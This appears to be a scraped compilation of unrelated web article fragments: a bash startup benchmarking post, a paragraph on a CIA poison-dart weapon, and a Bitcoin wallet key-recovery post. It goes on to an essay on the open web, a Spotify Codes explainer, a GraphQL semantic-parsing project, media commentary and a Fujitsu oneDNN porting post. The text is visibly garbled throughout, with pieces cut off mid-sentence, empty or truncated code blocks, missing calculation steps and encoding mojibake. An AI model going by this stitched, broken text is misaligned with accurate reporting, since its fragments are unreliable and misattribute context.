Benchmark #1: bash -i
  Time (mean ± σ):      55.7 ms ±   1.0 ms    [User: 47.6 ms, System: 11.1 ms]
  Range (min … max):    54.8 ms …  58.9 ms    53 runs
</code></pre></div></div>

<h4 id="history">history</h4>

<p>Some of those additional 26&nbsp;ms are spent reading my huge
(<code>HISTSIZE=​50000</code>) <code>.bash_​history</code> file. I will skip the details
about how I investigated this, because I didn’t: I stumbled upon this by
chance while testing something else.</p>

<p>We can see that using an empty history file brings us down to a little under
40&nbsp;ms:</p>

<div><div><pre><code>[tomi@notes ~]$ HISTFILE=/tmp/.bash_history_tmp hyperfine 'bash -i'
Benchmark #1: bash -i
  Time (mean ± σ):      38.6 ms ±   0.7 ms    [User: 34.0 ms, System: 7.8 ms]
  Range (min … max):    37.8 ms …  42.3 ms    75 runs
</code></pre></div></div>

<p>Now, cutting 17&nbsp;ms by sacrificing the shell history is probably not a good
deal for most people. I settled for setting up a systemd
<a href="https://github.com/liskin/dotfiles/blob/f978be7424946afebe56dbe5ecc85c9f36d1e057/.config/systemd/user/liskin-backup-bash-history.timer">timer</a>
to <a href="https://github.com/liskin/dotfiles/blob/f978be7424946afebe56dbe5ecc85c9f36d1e057/bin/liskin-backup-bash-history">back up
<code>.bash_​history</code></a>
to git once a day and lowered <code>HISTSIZE</code> to 5000<sup id="fnref:history" role="doc-noteref"><a href="#fn:history">3</a></sup>. This still keeps
my bash startup below 40&nbsp;ms:</p>

<div><div><pre><code>[tomi@notes ~]$ hyperfine 'bash -i'
Benchmark #1: bash -i
  Time (mean ± σ):      39.9 ms ±   0.5 ms    [User: 36.1 ms, System: 6.8 ms]
  Range (min … max):    39.1 ms …  42.1 ms    73 runs
</code></pre></div></div>

<h3 id="conclusion">Conclusion</h3>

<p>By dropping unnecessary invocation of <code>man -w</code>, deferring loading of git
completions to when they’re needed, and shortening my shell history file, I
managed to speed up bash startup from 165 ms to 40 ms.</p>

<div><div><pre><code>Benchmark #1: bash -i

<p>More importantly, I no longer type before the prompt, even if I try!</p>

Embree’s research led to the development of a top-secret weapon known as the “heart-attack gun.”</p><p>It involved the freezing of shellfish toxin mixed with water to form a frozen dart which would then be fired from the heart-attack gun. Once inside the body, the poison would then dissolve into the person’s bloodstream and cause a heart attack.</p><p>In 1975 CIA Director William Colby presented the weapon at a Church Committee hearing, chaired by Senator Frank Church. The heart attack gun was a handgun with a sight affixed to the top, had a battery in the handle, and used electricity to fire a dart.</p><p>Colby told the committee that the weapon was capable of firing a dart which could enter the body “without perception.” The only way of knowing that the person had been shot by the weapon, was the presence of a tiny red dot at the point of entry. Colby also claimed that the poison would not show up in the autopsy. The official cause of death would, therefore, be deemed a heart attack. The weapon was developed in order to allow the CIA to commit assassinations that could never be traced back to them.</p><p id="loadergif"><img width="100" height="100"

November 19, 2020 | https://kewde.github.io/corrupted-bitcoin-wallet | <a href="https://web.archive.org/web/*/https://kewde.github.io/corrupted-bitcoin-wallet">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p>A friend of a relative had brought in their Macbook Air, and kindly asked me to repair it.
This required me to download the latest MacOS for which I didn’t have enough space for.
In a desperate attempt, I decided to clean up my external hard drive, removing files that were taking up too much storage.</p>

<p>This is the exact moment that karma had found its way to my 4 AM adventure to fix this MacBook.</p>

<p>To my surprise I found a folder named “Btc”, where I stored episode of television shows. 
Apparently it has been there since 2015 - this must have been my very first wallet!</p>

<p>Sadly, the wallet wouldn’t open in bitcoin core, it has been corrupted.
The <code>db.log</code> outputs the logs for the BerkeleyDB wallet file, it indicated the following error message:</p>
<pre><code>file wallet.dat has LSN 780/2077553, past end of log at 1/333
Commonly caused by moving a database from one database environment
to another without clearing the database LSNs, or by removing all of
the log files from a database environment
DB_ENV-&gt;log_flush: LSN of 780/2077553 past current end-of-log of 1/333
Database environment corrupt; the wrong log files may have been removed or incompatible database files imported from another environment
</code></pre>

<p>Therefore I was forced to salvage the wallet somehow.
The <code>Bitcoin Core</code> software has an option <code>-salvagewallet</code> which did not appear to help.</p>

<p>A bit of googling around and I found out that uncompressed private keys are prepended with <code>01 01 04 20</code>.
Time to take a quick scroll through the file in <code>HxD</code>, a popular hex editor!</p>

<p><img src="https://kewde.github.io/res/corrupted-bitcoin-wallet/HxD-search.png" alt=""></p>

<p><img src="https://kewde.github.io/res/corrupted-bitcoin-wallet/HxD-search-2.png" alt=""></p>

<p>I didn’t expect to get 145 hits, but what I certainly didn’t want to do was manually converting all of those hits to private keys and checking the balance.</p>

<p><img src="https://kewde.github.io/res/corrupted-bitcoin-wallet/HxD-search-3.png" alt=""></p>

<p>The private key is 32 bytes long and is just after our prefix.</p>
<pre><code>ffb2b2ed484fa1d5c9b2f4ad8e7ec696
</code></pre>

<p>So I got to work, the result is below.</p>


<pre><code>pip install bit
</code></pre>

<p>Take the code below and put in a file named <code>salvage.py</code>
<strong>Do not forget to uncomment and change the address variable on line 7</strong>.</p>

<p>Finally, run the script!</p>
<pre><code>python salvage.py
</code></pre>

<p>It will output something like this, and if it finds funds, will automatically transfer them over to the address your specified.
PS: do not post this publicly, the first string is the <code>private key</code>, followed by the <code>address</code> and finally the <code>amount of btc</code>.</p>

<p>In retrospect, I could’ve used PyWallet but I decided not to.</p>

<h2 id="stricter-validation">Stricter validation</h2>
<p>The PyWallet implementation does a lot more checks before it decides that a key is “valid”.
It seems to be using a concept of both “prefixes” and “suffixes” for the keys.
Additionally the prefix used in <code>PyWallet</code> is a lot larger, <code>308201130201010420</code> instead of <code>01010420</code>.
If by any chance a single character of the prefix and/or suffix get corrupted, it will not detect it as a key.
My approach is more aggressive in the sense that it will attempt anything that might look like a key.</p>

<h2 id="unencrypted-wallet">Unencrypted wallet</h2>
<p>Additionally, my wallet was not encrypted, therefore it was a bit overkill to use PyWallet.</p>

<h2 id="the-real-reason">The real reason</h2>
<p>I was ony my Windows machine and I didn’t feel like spending an hour to install dependencies like <code>python-twisted</code>, when I could get the job done with less code.</p>

<p>Nonetheless, PyWallet is a great tool and it is worth using for encrypted wallets.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content"><div><div><p><em>Part 1: How your user experience changes for the worse as the open web gives way to walled gardens</em></p><p>I hang out in two circles. Open web enthusiasts that are lamenting its demise, and regular users who are happy with their fast snappy apps and couldn't care less. </p><p>These groups have a hard time talking because the "open web" too often comes across as an idealistic abstract notion and most end users just don't tangibly feel the bad consequences. In fact, they're often happier with the snappy, vertically integrated experience of closed app ecosystems. </p><p>My goal here is to make it more palpable how everyday apps, searches and tools get worse when we let big centralized companies take over the web, and explore some paths for reversing it.</p><h2>What is the the open web?</h2><p>Most definitions of the "open web" I've seen are either too technical to be accessible or too abstract to be usable and getting gridlocked in this debate often means watching from the sidelines while actual user welfare slowly diminishes.</p><p>Three characteristics that proponents of the open web will agree to in roughly descending order are:</p><ul><li><strong>Ease of publishing</strong>: anyone can publish to it freely or at least very cheaply, and is on the same footing with a globally accessible URL</li><li><strong>Ease of consuming</strong>: Net neutrality — ISP's dont cut deals with corporations to make some websites load faster or cheaper than others.</li><li><strong>Ease of remixing</strong>. You can see the source code. Content licenses and tools are permissive for derived works.</li></ul><h2>Detour: A framework to break down how people use the web</h2><p>I want to focus on the user experience point of view. To do this, I'm going to introduce a framework that divides up all our internet usage into two categories.</p><p><img src="https://landen.imgix.net/blog_uSsTzKptQlxlvUvQ/assets/xscGdbWOOPkGjdER.png" alt="Frame 1.png"></p><h3><strong>Unfamiliar problems</strong></h3><p>You have an unfamiliar problem and to solve it you either need to learn something new, or purchase goods or services to solve it</p><ul><li>e.g. taking out a mortgage, a health problem in the family, where to go to college, what skill to acquire next.</li><li>Unfamiliar problems are solved in large part with acquiring new knowledge, not just products or services.</li><li>These user journeys start with search engines — Google predominantly and **a lot of the time solving them is spent on web pages**.</li><li>When people are looking to solve unfamiliar problems, **revenue is typically higher-margin**, because users can't price the products and services as well.</li><li>These ultimately transition to being familiar problems.</li></ul><h3><strong>Familiar problems</strong></h3><ul><li>e.g. being entertained, keeping the dog food in stock,</li><li>These are best solved with apps like Email, Netflix, Twitter, DTC subscription boxes, etc.</li><li>Solving these needs has a very well defined user interaction journey. You open the app you're familiar with and follow its standard flow.</li><li>Revenue from people solving familiar problems is typically lower-margin and there's more competing products.
</li></ul><h3>How we're spending our time on familiar vs. unfamiliar problems</h3><p>Using time spent in apps vs mobile web on mobile is a way to proxy how we divide up our time.<strong> We spend most of our time on familiar problems but have a constant trickle of unfamiliar problems</strong>.</p><p><img src="https://landen.imgix.net/blog_uSsTzKptQlxlvUvQ/assets/cPuXkKFELALeIAkI.png" alt="Untitled (1).png"></p><h2>Unfamiliar problems are better solved with the open web</h2><p>Think about the last time you did some research, e.g. choosing a phone plan. You asked your friends, compared on forums, looked at the official sites, scribbled some notes and made a decision. Even if this journey was quick, you likely traversed a dozen services and products to do this.</p><p>Unfamiliar problems have less constraints, require creativity to solve, and thus are better suited to open solutions. Some other things that work for the open web here</p><ul><li>comparing alternatives is easier.</li><li>changing modalities (e.g. from reading to video) is easier.</li></ul><h2>Familiar problems stand to benefit more from tight vertical integration</h2><p>Take Spotify for example. It solves the very familiar problem of listening to music. Spotify just works better as an app because</p><ul><li>Controlling the user experience end to end makes for smoother flows.</li><li>Having all the user data kept with Spotify allows for better recommendation algorithms.</li><li>Spotify can easily hand off between devices.</li><li>It can run in the background</li></ul><p>Sure, the web can do a bunch of these things, but they're simply not first-class considerations in the open-read-close workflow that the browser was designed for.</p><h2>But the open web can be better for familiar problems too, especially for breaking monopolies</h2><p>Let's look at Amazon. Initially you start buying there because of their "always low prices" and the convenience of 2 day shipping. Over the years you keep shopping there, until you've forgotten that </p><ol><li>free 2 day shipping is now near universal</li><li>amazon isn't often the cheapest place</li></ol><p>On the Amazon app, you see the story around the product that best serves Amazon, not the buyer. Meanwhile, over on Insight you can use the web version and do all these things the app can't.</p><p><img src="https://landen.imgix.net/blog_uSsTzKptQlxlvUvQ/assets/ZEblynrLvBsutnlQ.png" alt="Screen Shot 2020-11-17 at 5.42.21 PM.png"></p><p>... and not just that

</p><p><img src="https://landen.imgix.net/blog_uSsTzKptQlxlvUvQ/assets/JVZoTRazmYPZXBQQ.png" alt="Screen Shot 2020-11-17 at 5.59.22 PM.png"></p><h2><strong>How solving unfamiliar problems gets harder too</strong></h2><p>Unfamiliar problems are solved in large part with acquiring new knowledge, not just products or services. The incentives to freely create knowledge that solves unfamiliar problems is lost as the web closes down.</p><ul><li>Google increasingly takes a larger percent of ad revenue as they <a href="https://sparktoro.com/blog/less-than-half-of-google-searches-now-result-in-a-click/">start extracting answers from pages and showing them on their search result pages.</a><a href="https://sparktoro.com/blog/less-than-half-of-google-searches-now-result-in-a-click/"></a></li><li><a href="https://sparktoro.com/blog/less-than-half-of-google-searches-now-result-in-a-click/"></a>Publishers have to either a) paywall their content (e.g. NYTimes) or b) subtly sell products (everyone standing a Wirecutter alternative), or c) ask for donations in order to survive.</li><li>Only a few big name publishers survive. Google and Facebook start sending them more of the traffic that's left, and since domain rank plays a big part in Google's ranking, those that survived assimilate more power and rank better.</li><li>and search engines seem more littered with SEO junk and less actually useful information year over year.</li></ul><h2>In conclusion, and where we fit in.</h2><p>And that's how your user experience slowly degrades, and that's why we stand to suffer as users if we give up the ability to remix software that the web brought us and closed apps are now taking away. </p><p>Our goal with Insight is to give the web (in particular on mobile) a fighting chance by exhibiting how it can be more powerful than a closed ecosystem and give more control to the end-user. We do this by showcasing the web's infinite extensibility and customizability for common use cases like <a href="http://insightbrowser.com/collections/search">search</a>, <a href="https://insightbrowser.com/collections/shopping">shopping</a>, <a href="https://insightbrowser.com/collections/reading">reading</a> and <a href="https://insightbrowser.com/collections/cooking">cooking</a>.</p><p>Insight's advanced features will soon only be available to Pro subscription users but for a limited time we're opening up <strong>lifetime free beta access if you download it via TestFlight below.</strong></p><h3>Coming up in part 2</h3><ul><li>What parts of the open web probably should die off?</li><li>A pragmatic path for what's left of the open web to thrive again.</li></ul><p>We'd love to hear from you, feel free to tweet at or DM us at @<a href="https://twitter.com/insightbrowser">insightbrowser</a> </p></div></div></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><article><div><p><img src="https://boonepeter.github.io/imgs/spotify/spotify_track_6vQN2a9QSgWcm74KEZYfDL.jpg" alt="Spotify barcode"></p><p><a href="https://www.spotifycodes.com/">Spotify Codes</a> are QR-like codes that can be generated to easily share Spotify songs, artists, playlists, and users. I set out to figure out how they worked, which lead me on a winding journey through barcode history, patents, packet sniffing, error correction, and Gray tables.</p><h2 id="spotify-uris">Spotify URIs</h2><p>Let’s start with Spotify URIs (Uniform Resource Identifiers). Different pieces of media (artists, albums, songs, playlists, users) all have a URI.</p><p>The ABBA song “Take a Chance on Me” has this URI:</p><p><code>spotify:track:6vQN2a9QSgWcm74KEZYfDL</code>.</p><p>The ABBA Album “The Album” has the following URI:</p><p><code>spotify:album:5GwbPSgiTECzQiE6u7s0ZN</code></p><p>As you can see, the URIs can be broken up into components:</p><p><code>spotify:&lt;media type&gt;:&lt;22 characters&gt;</code>.</p><p>The 22 characters are the numbers 0-9, characters a-z and A-Z. This means there are <code>10 + 26 + 26 = 62</code> possibilities for each character (almost <a href="https://en.wikipedia.org/wiki/Base64">Base64</a>). So the potential number of Spotify URIs is <code>62^22</code> which is equal to <code>2.7e39</code> or</p><div><pre><code data-lang="python"><span>2</span>,<span>707</span>,<span>803</span>,<span>647</span>,<span>802</span>,<span>660</span>,<span>400</span>,<span>290</span>,<span>261</span>,<span>537</span>,<span>185</span>,<span>326</span>,<span>956</span>,<span>544</span>
</code></pre></div><p>To illustrate that number:</p><div><pre><code data-lang="python">x <span>=</span> <span>62</span> <span>**</span> <span>22</span>
<span># the number of milliseconds in a year</span>

<span># the number of words in the bible (about 1 million)</span>
x <span>//=</span> <span>1000000</span>
</code></pre></div><p>If Spotify printed a whole Bible’s worth of URIs every millisecond they could do this for <code>85,863,890,404,701,306,452,633</code> years. Safe to say Spotify is not going to run out of URIs anytime soon.</p><h2 id="barcode-background">Barcode background</h2><p>The <a href="https://en.wikipedia.org/wiki/Barcode">history of barcodes</a> is quite extensive. Information is encoded into different barcodes in a variety of ways.</p><p>A lot of barcodes encode data in the <strong>widths</strong> of vertical bars. Universal product codes (UPCs) encode 12 digits using combinations of vertical bars of different widths:</p><p><img src="https://boonepeter.github.io/imgs/spotify/upc.png" alt="UPC encodings"></p><p><a href="https://en.wikipedia.org/wiki/KarTrak">Another barcode</a> uses colors to encode data:</p><p><img src="https://boonepeter.github.io/imgs/spotify/KarTrak_ACI_codes.svg.png" alt="Kartrack barcode"></p><p><a href="https://en.wikipedia.org/wiki/QR_code">QR codes</a> use a 2d matrix of dots to encode data.</p><p><img src="https://boonepeter.github.io/imgs/spotify/qr_code.png" alt="QR code"></p><p>A lot of mail barcodes encode data using the <strong>height</strong> of the bars (like the <a href="https://en.wikipedia.org/wiki/Intelligent_Mail_barcode">Intelligent Mail barcode</a>).</p><p><img src="https://boonepeter.github.io/imgs/spotify/intelligent_mail_barcode.png" alt="Intelligent mail barcode"></p><h2 id="spotify-codes">Spotify Codes</h2><p>Spotify codes work like the <a href="https://en.wikipedia.org/wiki/Intelligent_Mail_barcode">Intelligent Mail Barcode</a>.

I suspect setting the first and last bar set to 0 is an aesthetic choice: it makes the barcode look more like a sound wave.

I used to think academic papers were full of jargon until I read some technical patents.</p><h3 id="the-process">The Process</h3><p>When you visit <a href="https://www.spotifycodes.com/">Spotify codes</a> and input a Spotify URI, a “media reference” is created by Spotify. This media reference is 37 bits long and is the key that links a barcode to a given URI. The media reference may just be the hash of an incrementing index. After extracting a media reference from a barcode, you check with Spotify’s database (a look-up table) to determine what URI it corresponds to.

This makes the decoding process more reliable. Decoding Spotify codes involves going from analog (bar lengths) to digital (media reference), so it is a good candidate for this error correction.</p><blockquote><p>The fundamental principle of [error correction] is to add redundant bits in order to help the decoder to find out the true message that was encoded by the transmitter.</p></blockquote><p>A simple example of error correction would be to replicate each bit twice. So instead of sending <code>1</code>, you would send <code>111</code>. When that triplet is sent across a “noisy” communication channel, some of the bits could get flipped. But since there are 2 redundant bits, the receiver can guess what the value was meant to be:</p><table><thead><tr><th>Triplet received</th><th>Interpreted as</th></tr></thead><tbody><tr><td>000</td><td>0 (error-free)</td></tr><tr><td>001</td><td>0</td></tr><tr><td>010</td><td>0</td></tr><tr><td>100</td><td>0</td></tr><tr><td>111</td><td>1 (error-free)</td></tr><tr><td>110</td><td>1</td></tr><tr><td>101</td><td>1</td></tr><tr><td>011</td><td>1</td></tr></tbody></table><p>The patents don’t specify what forward error correction schema Spotify uses, but they do say that they add 15 bits at this step. The code rate of an error correction scheme is the ratio of the information bits to the total encoded bit length. Spotify adds 15 bits to the 45 bit code, so the code rate is <code>45 / 60 = 0.75</code>. This code rate is high (close to 1) meaning it is fairly weak. It facilitates a limited amount of error correction, but that is okay. If you are sending a message to a deep space probe you want a very strong code. A Spotify code is pretty low risk: it’s easy to ping the server a few times if you decode the wrong media reference.</p><p>The total forward error corrected code is 60 bits long, which is the exact amount of information that can be encoded in the 20 octals (bar heights) in the Spotify barcode!</p><p>The patents do mention that Spotify uses the <a href="https://en.wikipedia.org/wiki/Viterbi_decoder">Viterbi algorithm</a> to decode the media reference from the forward error corrected code. I won’t go into it here, but that algorithm uses the redundant bits from the forward error correction to determine the best guess of the actual media reference.</p><h3 id="gray-code">Gray Code</h3><p>I really like this part of the Spotify codes.</p><p><a href="https://en.wikipedia.org/wiki/Gray_code">Gray code</a> is an alternative way to represent a binary number. If you look closely at the following table, you will see that Gray code works by changing only one bit at a time.</p><table><thead><tr><th>Decimal</th><th>Binary</th><th>Gray</th></tr></thead><tbody><tr><td>0</td><td>000</td><td>000</td></tr><tr><td>1</td><td>001</td><td>001</td></tr><tr><td>2</td><td>010</td><td>011</td></tr><tr><td>3</td><td>011</td><td>010</td></tr><tr><td>4</td><td>100</td><td>110</td></tr><tr><td>5</td><td>101</td><td>111</td></tr><tr><td>6</td><td>110</td><td>101</td></tr><tr><td>7</td><td>111</td><td>100</td></tr></tbody></table><p>Why does Spotify use Gray code? What is wrong with normal binary representation of the code?</p><p>The difference between 3 and 4 in Gray code is only 1 bit (<code>010 -&gt; 110</code>). In normal binary representation, that difference is 3 bits (<code>100 -&gt; 011</code>). When going from analog (the height of a given bar) to binary, using Gray codes reduces the number of bits that are “wrong” if we calculate the wrong height.</p><p>If the height of a bar is supposed to be 3, but we calculate that it is 3.51 and we round up to 4, the binary representation of that number in Gray code will only be off by one bit. <strong>This makes the forward error …</strong></p></div></article></div></div>

<p>The OpenAI scholars program requires a final open source project. I've been eagerly working on it and I'm happy to present it now. Along with this blog post, my final presentation, code and an academic paper, I present &nbsp;<strong>Semantic Parsing English-to-GraphQL </strong>(SPEGQL). </p><p>I presented this project in my final project proposal. So in this post, I'll cover some of the highlights. The full details can be found in <a href="https://docs.google.com/document/d/1EmAFC2LGxu8zG3LI6vMt8SrGpjwYtBpnDqCtj_AnDJQ/edit?usp=sharing">this paper</a>. &nbsp;</p><h3 id="background">Background</h3><p><strong>GraphQL</strong></p><p><a href="https://graphql.org/">GraphQL</a> is a query language for your api.</p><p>It's become very popular recently because of several reasons. It represents the schema as a graph, nested relations of any depth can be easily queried, it can aggregate data over multiple datasources and responses are predictable among other things.</p><p><strong>Semantic Parsing</strong></p><p>Semantic parsing is the task of converting a natural language utterance to a logical form: a machine-understandable representation of its meaning. In this case I wanted to semantically parse English to GraphQL.<br></p><p>Why this project?</p><p>I had a few reasons to work on this project:</p><ul><li>I wanted to understand the limits of general language models for Semantic Parsing</li><li>This project could potentially ease the learning curve for new developers of GraphQL </li><li>Potential tooling for non technical data users such as managers to gain insights into their data</li></ul><h2 id="objective">Objective</h2><p>Given an English prompt:</p><blockquote><em>“What is the name and date of the song released most recently?”</em></blockquote><p>And some GraphQL Schema</p><pre><code>type song {

 file: files

<p>Find a corresponding GraphQL Query: </p><pre><code>query {
 song(limit: 1, order_by: {releasedate: desc}) {
   song_name

<p>This objective could be tested by passing the prompt and schema though a model to output a query.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Welcome to Thursday! </p><p>I’ve been reading some interesting policy reports about everything from <a href="https://t.co/CxLqshzCAg">maternal mortality</a> to <a href="https://www.urban.org/urban-wire/can-we-design-student-loan-forgiveness-target-low-income-families">how to target student loan forgiveness</a> but at the moment there is a lot of demand for me to address the situation at Vox in detail or to assimilate my personal story into a larger narrative about “wokeness” or the culture wars. Personally I’m not a huge fan of navel-gazing. So I’ll just say that my personal interest in reclaiming my status as an independent, blog-like voice transcends any particular issues with any particular publication. I wanted to do <em>this,</em> not go find a different job, and I thank those of you who’ve joined me on this journey.</p><p>But Vox is typical of a few trends that exist broadly in the media industry and that I do think are of interest. </p><ul><li><p>The staff skews very young. </p></li><li><p>The staff is concentrated in big coastal cities, and especially New York.</p></li><li><p>The staff is overwhelmingly composed of graduates of selective colleges (state university flagship campuses and private schools with names you know).</p></li></ul><p>The media industry has long skewed young, educated, and New Yorky. But digital disruption trends have made it more so than ever before. Daily newspapers published in mid-sized cities and small towns are weaker and less significant. A lot of reporters born in the 1960s and 1970s have left the industry as it has shrunk and few of them work at digital native startups. </p><p>Separately from that change, national politics has been polarizing around age, educational attainment and population density in an unprecedented way. A group of young, recent college graduates living in Brooklyn would’ve skewed left in 1990 but this was an era when Al D’Amato could win statewide in New York and Democratic presidential campaigns would win in West Virginia. Today a demographically identical group skews much further left than it used to. None of this is really an outcome that anyone particularly wanted or intended. But it’s put a big thumb on the scales ideologically at the exact same time that economic trends have turned against the startups.</p><p>The result is that I think you should expect the instability we’ve seen this fall to be just the leading edge of the wedge.  </p><h4>Most media isn’t political journalism </h4><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fce695ac4-18ca-4c53-a705-9cfd4bf75644_1616x1168.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fce695ac4-18ca-4c53-a705-9cfd4bf75644_1616x1168.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/ce695ac4-18ca-4c53-a705-9cfd4bf75644_1616x1168.png&quot;,&quot;height&quot;:1052,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:2381922,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null}" alt=""></a><figcaption>Culture criticism today: Calling out various problematic things</figcaption></figure></div><p>Reeves Wiedeman’s recent <a href="https://nymag.com/intelligencer/2020/11/inside-the-new-york-times-heated-reckoning-with-itself.html">article about internal tensions at The New York Times</a> includes this passage, which gets at a dynamic that I think you see across the media landscape. The vast majority of the people who work at any given publication are not professional political journalists, and generally the further you get from the ~~political journalism~~ section of a media organization the more left-wing things get: </p><blockquote><p>Of all the fronts on which the Times was being pushed to change, the strongest insurrectionary energy was coming from legions of newsroom-adjacent employees in digital jobs that didn’t exist a decade ago. The employees responsible for distributing the Times in the past — typesetters, pressmen, delivery drivers — had never been encouraged to speak up about the ethical questions at the heart of the paper’s journalism. But the app developers and software engineers who deliver the Times’ journalism to the world have held their hands up in just as many Ivy League seminars as their editorial peers. They might be too shy to march over to a masthead editor and complain about a clumsy headline, but #newsroom-feedback had opened a digital door to criticism. Reporters found that suddenly it was the Times’ programmers and developers, rather than their editors, who were critiquing their work. During the town hall about the Cotton op-ed, one data engineer said on Slack, “How many such process failures would be tolerated in tech?”</p><p>Many of the techsurrectionists had come from Facebook or Uber or Amazon to join the Times out of a sense of mission, leaving the ethical quandaries of the tech industry for what they thought were more virtuous pastures. “I joined the company for one reason, and it’s because I feel a responsibility to be a part of a mission that I believe in,” a product manager who previously worked at Apple wrote in #newsroom-feedback after the Cotton op-ed. “This feels like the rug’s been pulled out from under us — not just because it feels like that mission [has] been severely compromised by the decision to publish this piece, but even more so because the products we’re building were used to do it.”</p><p>“It’s like making telephone poles,” one software engineer added, “and finding out they’re being used as battering rams.”</p></blockquote><p>People who cover politics professionally, for better or worse, end up spending a fair amount of time talking to Republicans and trying to understand what conservatives think about public policy issues. If we’re doing our jobs at all correctly we can do stories that bring a mostly-progressive audience a greater understanding of what is happening on the other side. And when a professional political reporter does a bad job it’s often because he or she is taking a dive to maintain relationships with sources on the right, or bending over <em>too far</em> backwards to be fair. </p><p>At the same time, we political journalists have our fair share of totally ignorant hot takes about music or cooking or sports or whatever else that we can fire off. </p><p>The flip side is that our colleagues who cover sports or music or cooking also have hot takes about politics. Hot takes that come from the very narrow demographic and ideological niche that dominates the media and is untempered by the need to actually cover politics.</p><h4>Coverage has gotten really weird </h4><p>Ian Walker <a href="https://kotaku.com/playstation-5-the-kotaku-review-1845588904">recently ended his PS5 review for Kotaku with this thought</a>: </p><blockquote><p>The world is still reeling under the weight of the covid-19 pandemic. There are more Americans out of work right now than at any point in the country’s history, with no relief in sight. Our health care system is an inherently evil institution that forces people to ration life-saving medications like insulin and choose suicide over suffering with untreated mental illness.</p><p>As I’m writing this, it looks very likely that Joe Biden will be our next president. But it’s clear that the worst people aren’t going away just because a new old white man is sitting behind the Resolute desk—well, at least not&nbsp;<em>this</em>&nbsp;old white man. Our government is fundamentally broken in a way that necessitates radical change rather than incremental electorialism.</p><p>The harsh truth is that, for the reasons listed above and more, a lot of people simply won’t be able to buy a PlayStation 5, regardless of supply.

<h2>Introduction</h2>

<p>Hello everyone. This is <a href="https://github.com/kawakami-k">Kawakami</a> from the Fujitsu Laboratories Platform Innovation project. The new Fugaku supercomputer has been delivered to Port Island located off the coast of Kobe. Developed jointly by RIKEN and Fujitsu, this supercomputer has entered the trial run phase this year ahead of schedule. As of June, it has already won four "firsts" in worldwide supercomputer rankings (<a href="https://www.fujitsu.com/global/about/resources/news/press-releases/2020/0622-01.html">TOP500, HPCG, HPL-AI</a>, <a href="https://www.fujitsu.com/global/about/resources/news/press-releases/2020/0622-02.html">Graph500</a>), so it is off to a very promising start. My department is involved in researching and developing techniques to accelerate deep learning (DL) processes on Fugaku and PRIMEHPC FX1000/700, which is our product that uses the same CPU as Fugaku. In this post, I will talk about our efforts to port oneDNN (library software used to accelerate DL processes) to Fugaku, and to contribute and incorporate our source code into Intel's main branch of oneDNN.</p>

<h2>Software stack for deep learning processes</h2>

<p>Applications that make use of deep learning processes (hereinafter called â€œDL processesâ€�) normally consists of a software stack formed from two layers: a framework layer and a library layer (as shown below). When a user wants to run an application that uses a DL process, they use an API provided by the framework to define the neural network for the process to run and to describe processing details. The framework calls library software functions and calculates the actual DL process based on the provided definition and process details. The systems that run DL processes come in various forms and sizes (such as supercomputers, the cloud, PCs, and smartphones), and the hardware in the system that is actually running the process might be a CPU or GPU. By separating the software stack into two layers like this, different systems and hardware executing the DL process are merged in the library layer, so users can use the same framework. This is beneficial because it allows for the same ease of use for all users with regard to defining networks and describing processes.</p>

<figure title="Software stack for deep learning processes"><span itemscope="" itemtype="http://schema.org/Photograph"><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/f/fltech/20201117/20201117072431.png" alt="f:id:fltech:20201117072431p:plain" title="" itemprop="image"></span><figcaption>Software stack for deep learning processes</figcaption></figure>

<p>Individually optimized library software is available to maximize system and hardware performance. This software is normally developed by the vendors who develop and manufacture the hardware. For example, Intel and NVIDIA have developed and made available libraries for Intel CPUs and NVIDIA GPUs, respectively. Fugaku and FX1000/700 are equipped with A64FX CPUs, which offer an expanded instruction set called Scalable Vector Extension (SVE) for High Performance Computing on top of the Armv8-A instruction set (the same CPU found in Android smartphones and iPhones). A64FX is the first CPU in the world to offer both the Armv8-A instruction set and the SVE instruction set (hereinafter, they are referred as â€œArmv8-A instruction setâ€� together), so there was no DL process library optimized for this CPU.</p>

<h2>Development of a DL process library for the Arm architecture</h2>

<p>There was no DL process library for the Armv8-A instruction set, so we needed to develop a new one. However, even if we at Fujitsu developed a new library on our own, users would not use it unless it could easily be used from the framework. We therefore decided to use the oneDNN DL library, developed by Intel for the x64 instruction set, as a reference implementation. oneDNN is the de facto standard for DL process libraries using CPUs, and it is already supported by a range of frameworks. A deep learning library for Armv8-A that includes APIs for oneDNN could therefore be used without a user having to modify a framework.</p>

<p>The source code for oneDNN has been released as <a href="https://github.com/oneapi-src/oneDNN">OSS (https://github.com/oneapi-src/oneDNN)</a>, so it can be obtained and recompiled for the Armv8-A instruction set. However, oneDNN contains many implementations optimized at the assembler level for the x64 instruction set, so simply recompiling the original source code would not provide enough performance. This was the start of our difficulties. We will discuss this later in this post.</p>

<p>The chart below is an example of the increases in processing speed we obtained through optimizing code for Armv8-A. oneDNN can be used to run a range of processes used in DL processing, such as convolution, batch_normalization, eltwise, pooling, and reorder. The chart below compares the processing speed for the reorder process (in which data types are converted or reordered) when the oneDNN source code is compiled without modification for the Armv8-A instruction set, and when the source code is compiled after our optimizations were implemented. The software processing speed obtained with the original oneDNN source code compiled without modification is normalized as a value of 1. As shown in the chart, we were able to increase the speed up to 400 times over, depending on the type of test pattern (although our optimizations actually decreased the speed for several test patterns, there would be no problem when using this together with a framework due to the small absolute values in measurement errors and processing times). Optimizing code for A64FX also resulted in extraordinary processing speed increases in other processes as well.</p>

